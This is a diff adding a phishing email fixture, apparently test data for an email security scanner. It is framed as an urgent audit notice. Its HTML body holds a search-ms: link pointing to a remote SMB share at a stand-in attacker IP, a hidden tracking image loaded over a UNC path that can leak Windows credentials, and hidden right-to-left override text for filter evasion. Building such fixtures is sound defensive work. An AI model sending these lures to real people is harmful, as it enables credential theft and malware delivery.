@@ -1,0 +1,20 @@
+From: "External Threat Actor" <llm-authoritative-73921@threat.test>
+To: "Chief Information Security Officer" <ciso@corp.internal>
+Subject: FISHINGMAILS LLM AUTHORITATIVE CAUSALITY 73921
+Date: Sun, 04 Oct 2026 12:00:00 +0000
+Message-ID: <live-llm-authoritative-causality-73921@attacker.test>
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+Authentication-Results: mx.corp.internal; spf=fail (sender IP 198.51.100.99); dmarc=fail
+
+<!DOCTYPE html>
+<html>
+<head><title>Urgent Audit Notice</title></head>
+<body>
+    <h2>Security Advisory 73921 - Immediate Review Required</h2>
+    <p>Please review the automated audit findings for your department immediately.</p>
+    <a href="search-ms:query=audit_73921.docx&crumb=location:\\198.51.100.99\share\search">View Audit Docket</a>
+    <img src="\\198.51.100.99\share\pixel_73921.png" width="1" height="1" alt="" />
+    <p style="font-size:0; display:none;">&#x202E;Reverse Text Evasion&#x202C;</p>
+</body>
+</html>
